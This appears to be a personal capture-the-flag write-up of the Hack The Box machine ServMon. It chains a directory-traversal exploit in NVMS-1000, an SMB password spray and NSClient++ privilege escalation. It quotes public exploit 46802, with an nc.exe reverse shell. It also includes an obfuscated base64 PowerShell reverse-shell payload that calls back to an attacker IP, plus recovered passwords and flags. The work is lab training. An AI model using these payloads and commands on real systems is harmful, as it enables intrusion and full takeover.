
- [ ] Default Creds  
- [ ] Source Code
- [ ] Known Vuln
- [ ] BruteForce



# IP:  10.129.227.77




# Port Scanning


```powershell

nmap -sC -sV -oA nmap/ServMon 10.129.227.77

# Results:

Port 21 FTP: Allowed FTP access. 
```



# Port 80 - Webserver



![[Pasted image 20251212135100.png]]



```powershell
NVMS-1000

```


# Attempts

```powershell

# Default Password found on internent
admin : 123456 # didn't work.  -c 

# let's run directory discover
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
# All pages return 200 :(

```

# Search for known vuln:

![[Pasted image 20251212142212.png]]


# Test the known vuln 47774:

**`IT WORKS!!!`**

![[Pasted image 20251212142353.png]]


# Fixing the Exploit:

```powershell

# Since we know from public access to FTP that there's a Passwords.txt on Nathan's Desktop, we can change the requset to get it

GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt 


# Found Passwords: 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

# We cam now create a custom username list and try to bruteforce with the above passwords. 
```

![[Pasted image 20251212142536.png]]

# Check port 8443 (HTTPS)

![[Pasted image 20251212182318.png]]


```powershell
# NSClient++ password
# The NSClient++ password can be found by running:

nscp web -- password --display

# or you can sett a new password:

nscp web -- password --set new-password

```
# Check FTP Port 21:


![[Pasted image 20251212140244.png]]


 - It is possible to login anonymously
 - Found two user Directory folders: Nadine, Nathan
 - Exploring `Confidential.txt` in `Nadine's` folder:

```powershell
ftp> !cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

```


- Exploring Nathan's folder - There's a `Notes to do.txt`

```powershell

ftp> !cat "Notes to do.txt"

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
   
   
```


can't find anything else for now. Let's move on. 




# Check  SMB


![[Pasted image 20251212140259.png]]



enum4linux-ng HTB | tee enum4linux-ng.log

![[Pasted image 20251212140413.png]]


Bruteforcing using the known username/passwords:


```powershell
# command
nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success 
```


![[Pasted image 20251212144444.png]]

Found the creds:

> Nadine : L1k3B1gBut7s@W0rk


Seems like anonymous access can't be done. 



#### Authenticated SMBMAP


![[Pasted image 20251212145335.png]]



# SSH

Connect to the machine using: `Nadine:L1k3B1gBut7s@W0rk` 

![[Pasted image 20251212161358.png]]

User.flag:

> 62e8424d6caeecfe4b1b873e3004f7f3

---

# PrivEsc 

Since we have access to the machine, and we know NSClient++ is installed and we can check it's password. Let's go and do it:



```powershell
# C:\PROGRA~1\NSClient++>type nsclient.ini:

; Undocumented key                                                                                                                            
password = ew2x6SsGTxjRwXOT   
                                                                                                                
; Undocumented key                                                                                                                            
allowed hosts = 127.0.0.1                                                                                                                     
```

So it means the NSCLIENT++ can only be accessed/login locally via port 127.0.0.1

It can be verified: 

![[Pasted image 20251212182837.png]]


Since we need to access it via 127.0.0.1 of the machine, we need to enable port-forwarding

```powershell

# Press Enter to gon a new line and press "~" and then captical C (Shift+C) to enter SSH Command Mode:
nadine@SERVMON C:\PROGRA~1\NSClient++> ~C

# add port forwarding
nadine@SERVMON C:\PROGRA~1\NSClient++> 
ssh> -L 8443:127.0.0.1:8443

```

Now we can access it from our machine and via port forwarding:

![[Pasted image 20251212185317.png]]

Now, the password `ew2x6SsGTxjRwXOT` works. Whereas it wasn't working when I connected directly using: https://10.129.227.77:8443

# Check for existing vuln:


![[Pasted image 20251212192128.png]]

# 46802.txt

Going through this:

```

Exploit Author: bzyo                                                                                                                                                                                                                         
Twitter: @bzyo_                                                                                                                                                                                                                              
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation                                                                                                                                                                                    
Date: 05-05-19                                                                                                                                                                                                                               
Vulnerable Software: NSClient++ 0.5.2.35                                                                                                                                                                                                     
Vendor Homepage: http://nsclient.org/                                                                                                                                                                                                        
Version: 0.5.2.35                                                                                                                                                                                                                            
Software Link: http://nsclient.org/download/                                                                                                                                                                                                 
Tested on: Windows 10 x64                                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
Details:                                                                                                                                                                                                                                     
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.                                                                                                                                                                           
                                                                                                                                                                                                                                             
The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.
                                                                                                                                                                                                                                             
Prerequisites:                                                                                                                                                                                                                               
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.                     
                                                                                                                                                                                                                                             
Exploit:                                                                                                                                                                                                                                     
1. Grab web administrator password                                                                                                                                                                                                                                                                                                                                                                                                                                                        
- open c:\program files\nsclient++\nsclient.ini                                                                       
or                                                                                                                    
- run the following that is instructed when you select forget password                                                
        C:\Program Files\NSClient++>nscp web -- password --display                                                    
        Current password: SoSecret                                                                                    

2. Login and enable following modules including enable at startup and save configuration                                                                                                                                                     
- CheckExternalScripts                                                                                                
- Scheduler                                                                                                           

3. Download nc.exe and evil.bat to c:\temp from attacking machine                                                     
        @echo off                                                                                                     
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe                                                                   

4. Setup listener on attacking machine                                                                                
        nc -nlvvp 443                                                                                                 

5. Add script foobar to call evil.bat and save settings                                                               
- Settings > External Scripts > Scripts                                                                               
- Add New                                                                                                             
        - foobar                                                                                                      
                command = c:\temp\evil.bat                                                                            

6. Add schedulede to call script every 1 minute and save settings                                                     
- Settings > Scheduler > Schedules                                                                                    
- Add new                                                                                                             
        - foobar                                                                                                      
                interval = 1m                                                                                         
                command = foobar                                                                                      

7. Restart the computer and wait for the reverse shell on attacking machine                                           
        nc -nlvvp 443                                                                                                 
        listening on [any] 443 ...                                                                                    
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671                                               
        Microsoft Windows [Version 10.0.17134.753]                                                                    
        (c) 2018 Microsoft Corporation. All rights reserved.                                                          

        C:\Program Files\NSClient++>whoami                                                                            
        whoami                                                                                                        
        nt authority\system                                                                                           

Risk:                                                                                                                 
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System      


```


#### Execution

```powershell

# On Attackbox
 >>>> python base64_powershell.py 10.10.14.158 1337

powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA1ADgAIgAsACAAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

# Atackkbox:
rlwrap nc -nlvp 1337


# On target
cd C:\Windows\Temp>

echo powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA1ADgAIgAsACAAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= > evil.bat
```

![[Pasted image 20251212193400.png]]

![[Pasted image 20251212200053.png]]

![[Pasted image 20251212200146.png]]


Got the shell:
 
![[Pasted image 20251212195908.png]]

Get the flag:

![[Pasted image 20251212200305.png]]

# Root Flag

```powershell
3df81b7181d9906cf4af295e59056335
```


---


# Lessons Learned:


# Read NMAP Results more carefully:

1. Spend some time on the intial nmap reseult and make sure to have a footprint of all the services. 
2. If you see HTTP and SSL under a port, it means the port needs to be accessed via HTTPS
3. Always check known vuln to give you an idea what can be done

